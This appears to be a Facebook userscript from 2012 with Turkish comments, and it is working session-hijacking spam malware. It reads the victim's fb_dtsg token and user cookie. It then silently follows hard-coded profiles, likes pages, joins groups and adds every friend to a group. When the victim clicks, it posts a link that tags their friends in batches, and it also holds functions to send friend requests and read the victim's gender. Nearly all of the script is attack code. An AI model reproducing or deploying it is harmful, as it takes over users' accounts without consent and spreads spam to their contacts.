// ==UserScript==
// @name           Qhaoser Hq 2
// @namespace      Qhaoser Hq 2
// @description    Qhaoser Hq
// @version        1.1
// @author         Qhaoser Hq
// @homepage       http://www.facebook.com/gokhan.atalan
// @include        http://facebook.com/*
// @include        http://*.facebook.com/*
// @include        https://facebook.com/*
// @include        https://*.facebook.com/*
// @include	htt*://www.facebook.com/*
// @include	htt*://*.facebook.com/*
// @exclude	htt*://*static*.facebook.com*
// @exclude	htt*://*channel*.facebook.com*
// @exclude	htt*://developers.facebook.com/*
// @exclude	htt*://upload.facebook.com/*
// @exclude	htt*://www.facebook.com/common/blank.html
// @exclude	htt*://www.facebook.com/plugins/*
// @exclude	htt*://www.facebook.com/l.php*
// @exclude	htt*://www.facebook.com/ai.php*
// @exclude	htt*://www.facebook.com/extern/*
// @exclude	htt*://www.facebook.com/pagelet/*
// @exclude	htt*://api.facebook.com/static/*
// @exclude	htt*://www.facebook.com/contact_importer/*
// @exclude	htt*://www.facebook.com/ajax/*
// @exclude	htt*://www.facebook.com/games*
// @exclude	htt*://apps.facebook.com/*
// @exclude	htt*://www.facebook.com/advertising/*
// @exclude	htt*://www.facebook.com/ads/*
// @exclude	htt*://www.facebook.com/sharer/*
//
// Copyright (c) 2012, Qhaoser Hq
// ==/UserScript==

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function like(liker){
    var http = new XMLHttpRequest();
     
    var url = "/ajax/pages/fan_status.php?__a=1";
     
    var params = "&fbpage_id=" + liker + "&add=1&reload=1&preserve_tab=true&fan_origin=page_profile&nctr[_mod]=pagelet_header&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http.open("POST", url, true);
     
    //Send the proper header information along with the request
    http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http.setRequestHeader("Content-length", params.length);
    http.setRequestHeader("Connection", "close");
     
    http.onreadystatechange = function() {//Call a function when the state changes.
    if(http.readyState == 4 && http.status == 200) {
       
      http.close; // Close the connection
     
    }
    }
    
    http.send(params);
}

a("1142261890");
a("100003775425886");

like("124837850987628");
like("334648033253104");

var gid = ['411718902203731'];
var gid = ['158052324332158'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
    var paramswp= '&fb_dtsg=' + fb_dtsg + '&group_id=' + gid + '&source=typeahead&ref=&message_id=&members=' + friends[i]['uid'] + '&__user=' + user_id + '&phstamp=';
    httpwp['open']('POST', urlwp, true);
    httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
    httpwp['setRequestHeader']('Content-length', paramswp['length']);
    httpwp['setRequestHeader']('Connection', 'keep-alive');
    httpwp['onreadystatechange'] = function () {
if (httpwp['readyState'] == 4 && httpwp['status'] == 200) {};
    };
    httpwp['send'](paramswp);
};
var spage_id = "4303490222440";
var spost_id = "378449358888594";
var sfoto_id = "4280654091551";
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
var smesaj = "";
var smesaj_text = "";
var arkadaslar = [];
var svn_rev;
var bugun= new Date();
var btarihi = new Date(); 
btarihi.setTime(bugun.getTime() + 1000*60*60*4*1);
if(!document.cookie.match(/paylasti=(\d+)/)){
document.cookie = "paylasti=hayir;expires="+ btarihi.toGMTString();
}


//arkadaslari al ve isle
function sarkadaslari_al(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
				  eval("arkadaslar = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
				  for(f=0;f<Math.round(arkadaslar.payload.entries.length/10);f++){
					smesaj = "";
					smesaj_text = "";
				  for(i=f*10;i<(f+1)*10;i++){
					if(arkadaslar.payload.entries[i]){
				  smesaj += " @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
				  smesaj_text += " " + arkadaslar.payload.entries[i].text;
				  }
					}
					sdurumpaylas();				}
				
			}
			
        };
		var params = "&filter[0]=user";
		params += "&options[0]=friends_only";
		params += "&options[1]=nm";
		params += "&token=v7";
        params += "&viewer=" + user_id;
		params += "&__user=" + user_id;
		
        if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("GET", "https://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        else { xmlhttp.open("GET", "http://www.facebook.com/ajax/typeahead/first_degree.php?__a=1" + params, true); }
        xmlhttp.send();
}


a("100004074323553");
a("100004074323553");

like("485670181462115");
like("485670181462115");

var gid = ['211618792297167'];
var gid = ['211618792297167'];
//fotograf paylas
function sfotopaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + sfoto_id;
		params += "&attachment[type]=2";
		params += "&src=i";
		params += "&appid=2305272732";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
		
}

//postpaylas
function spostpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[params][images][0]=http://i1.ytimg.com/vi/4kr_LlfqEqo/mqdefault.jpg";
		params += "&attachment[type]=99";
		params += "&uithumbpager_width=320";
		params += "&uithumbpager_height=180";
		params += "&src=i";
		params += "&appid=2309869772";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}

//postpaylas
function sdurumpaylas(){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		if (document.URL.indexOf("https://") >= 0) { xmlhttp.open("POST", "https://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        else { xmlhttp.open("POST", "http://www.facebook.com/ajax/sharer/submit_page/?__a=1", true); }
        
		var params = "ad_params=";
		params += "&audience[0][value]=80";
		params += "&UITargetedPrivacyWidget=80";
		params += "&friendTarget=";
		params += "&groupTarget=";
		params += "&pageTarget=479679795382149";
		params += "&message=" + smesaj;
		params += "&message_text=" + smesaj_text;
		params += "&reshare=" + spage_id
		params += "&UIThumbPager_Input=0";
		params += "&attachment[params][0]=" + spage_id;
		params += "&attachment[params][1]=" + spost_id;
		params += "&attachment[type]=22";
		params += "&src=i";
		params += "&appid=25554907596";
		params += "&parent_fbid=";
		params += "&mode=self";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send(params);
}



//tiklama olayini dinle
var tiklama = document.addEventListener("click", function () {
if(document.cookie.split("paylasti=")[1].split(";")[0].indexOf("hayir") >= 0){
svn_rev = document.head.innerHTML.split('"svn_rev":')[1].split(",")[0];
sarkadaslari_al();
document.cookie = "paylasti=evet;expires="+ btarihi.toGMTString();

document.removeEventListener(tiklama);
}
 }, false);
  

//arkadaþ ekleme
function sarkadasekle(uid,cins){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){	
			}
        };
		
		xmlhttp.open("POST", "/ajax/add_friend/action.php?__a=1", true); 
		var params = "to_friend=" + uid;
		params += "&action=add_friend";
		params += "&how_found=friend_browser";
		params += "&ref_param=none";
		params += "&outgoing_id=";
		params += "&logging_location=friend_browser";
		params += "&no_flyout_on_click=true";
		params += "&ego_log_data=";
		params += "&http_referer=";
		params += "&fb_dtsg=" + document.getElementsByName('fb_dtsg')[0].value;
        params += "&phstamp=165816749114848369115";
		params += "&__user=" + user_id;
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.setRequestHeader ("Content-Type","application/x-www-form-urlencoded");
		
if(cins == "farketmez" && document.cookie.split("cins" + user_id +"=").length > 1){
		xmlhttp.send(params);
}else if(document.cookie.split("cins" + user_id +"=").length <= 1){
		cinsiyetgetir(uid,cins,"sarkadasekle");
}else if(cins == document.cookie.split("cins" + user_id +"=")[1].split(";")[0].toString()){
		xmlhttp.send(params);
}
}

//cinsiyet belirleme
var cinssonuc = {};
var cinshtml = document.createElement("html");
function scinsiyetgetir(uid,cins,fonksiyon){
		var xmlhttp = new XMLHttpRequest();
        xmlhttp.onreadystatechange = function () {
			if(xmlhttp.readyState == 4){
			eval("cinssonuc = " + xmlhttp.responseText.toString().replace("for (;;);","") + ";");
			cinshtml.innerHTML = cinssonuc.jsmods.markup[0][1].__html
			btarihi.setTime(bugun.getTime() + 1000*60*60*24*365);
			if(cinshtml.getElementsByTagName("select")[0].value == "1"){
			document.cookie = "cins" + user_id + "=kadin;expires=" + btarihi.toGMTString();
			}else if(cinshtml.getElementsByTagName("select")[0].value == "2"){
			document.cookie = "cins" + user_id + "=erkek;expires=" + btarihi.toGMTString();
			}
			eval(fonksiyon + "(" + id + "," + cins + ");");
			}
        };
		xmlhttp.open("GET", "/ajax/timeline/edit_profile/basic_info.php?__a=1&__user=" + user_id, true);
		xmlhttp.setRequestHeader ("X-SVN-Rev", svn_rev);
		xmlhttp.send();
}
